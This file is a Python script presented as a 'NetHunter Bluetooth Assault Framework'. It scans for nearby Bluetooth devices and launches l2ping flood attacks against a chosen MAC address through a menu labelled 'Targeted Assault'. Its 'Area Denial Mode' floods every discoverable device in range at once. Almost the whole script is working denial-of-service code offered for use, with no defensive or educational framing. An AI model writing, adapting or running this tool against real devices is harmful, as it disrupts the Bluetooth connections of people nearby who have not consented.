#!/usr/bin/env python3

import sys
import os
import re
import subprocess
import signal
from multiprocessing import Process, active_children

# ANSI Colors and Banner
COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "CYAN": "\033[96m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m"
}

BANNER = f"""
{COLORS['CYAN']}
▓█████▄  ██▀███   █    ██  ███▄ ▄███▓ ███▄ ▄███▓ ▄▄▄       ███▄    █ 
▒██▀ ██▌▓██ ▒ ██▒ ██  ▓██▒▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ 
░██   █▌▓██ ░▄█ ▒▓██  ▒██░▓██    ▓██░▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒
░▓█▄   ▌▒██▀▀█▄  ▓▓█  ░██░▒██    ▒██ ▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
░▒████▓ ░██▓ ▒██▒▒▒█████▓ ▒██▒   ░██▒▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░ ▒░   ░  ░░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
 ░ ▒  ▒   ░▒ ░ ▒░░░▒░ ░ ░ ░  ░      ░░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░
 ░ ░  ░   ░░   ░  ░░░ ░ ░ ░      ░   ░      ░     ░   ▒      ░   ░ ░ 
   ░       ░        ░            ░          ░         ░  ░         ░ 
{COLORS['RESET']}
{COLORS['MAGENTA']}NetHunter Bluetooth Assault Framework{COLORS['RESET']}
"""

def color(text, color_name):
    return f"{COLORS[color_name]}{text}{COLORS['RESET']}"

class NethunterBluetoothEngine:
    def __init__(self):
        self.check_root()
        self.check_environment()
        self.configure_radio()
        self.running = True
        signal.signal(signal.SIGINT, self.signal_handler)

    def check_root(self):
        if os.geteuid() != 0:
            print(color("[!] Root access required! Use 'sudo'", "RED"))
            sys.exit(1)

    def check_environment(self):
        required_tools = ['hcitool', 'l2ping', 'rfkill', 'hciconfig']
        for tool in required_tools:
            if not os.path.exists(f"/usr/bin/{tool}"):
                print(color(f"[!] Missing {tool} - install with 'apt install bluez'", "RED"))
                sys.exit(1)

    def configure_radio(self):
        print(color("[*] Configuring Bluetooth radio...", "CYAN"))
        os.system("rfkill unblock bluetooth")
        os.system("hciconfig hci0 up")
        os.system("hciconfig hci0 piscan")

    def scan_devices(self):
        print(color("\n[*] Starting Nethunter-enhanced scan...", "BLUE"))
        result = subprocess.run(['hcitool', 'scan', '--flush'], 
                              stdout=subprocess.PIPE, 
                              stderr=subprocess.PIPE,
                              timeout=15)
        devices = []
        for line in result.stdout.decode().split('\n'):
            match = re.search(r'([0-9A-F:]{17})\s+(.+)', line)
            if match:
                devices.append((match.group(1), match.group(2)))
        return devices

    def nethunter_attack(self, target):
        try:
            proc = subprocess.Popen([
                'l2ping', '-i', 'hci0', 
                '-s', '600', '-f', '-t', '0',
                target
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return proc.pid
        except Exception as e:
            print(color(f"[!] Attack failed: {str(e)}", "RED"))
            return None

    def signal_handler(self, sig, frame):
        print(color("\n[*] Shutting down Nethunter modules...", "YELLOW"))
        self.running = False
        os.system("hciconfig hci0 down")
        os.system("rfkill block bluetooth")
        sys.exit(0)

def main():
    print(BANNER)
    engine = NethunterBluetoothEngine()
    
    while engine.running:
        print(color("\nNetHunter BT Menu:", "BOLD"))
        print("1. Enhanced Device Scan")
        print("2. Targeted Assault")
        print("3. Area Denial Mode")
        print("4. Radio Control")
        print("5. Exit")
        
        choice = input(color("\nNH-BT> ", "MAGENTA")).strip()
        
        if choice == '1':
            devices = engine.scan_devices()
            if devices:
                print(color("\nDiscovered Targets:", "GREEN"))
                for idx, (mac, name) in enumerate(devices, 1):
                    print(f"{idx}. {mac} - {name}")
            else:
                print(color("[!] No viable targets detected", "RED"))
        
        elif choice == '2':
            target = input("Enter target MAC: ").strip()
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', target):
                print(color("[!] Invalid MAC format", "RED"))
                continue
            pid = engine.nethunter_attack(target)
            if pid:
                print(color(f"[+] Attack launched (PID: {pid})", "GREEN"))
        
        elif choice == '3':
            print(color("[*] Flooding all discoverable devices...", "RED"))
            devices = engine.scan_devices()
            for mac, _ in devices:
                engine.nethunter_attack(mac)
        
        elif choice == '4':
            print(color("\nRadio Control:", "CYAN"))
            os.system("hciconfig hci0")
            os.system("rfkill list bluetooth")
        
        elif choice == '5':
            engine.signal_handler(None, None)
        
        else:
            print(color("[!] Invalid command", "RED"))

if __name__ == "__main__":
    main()
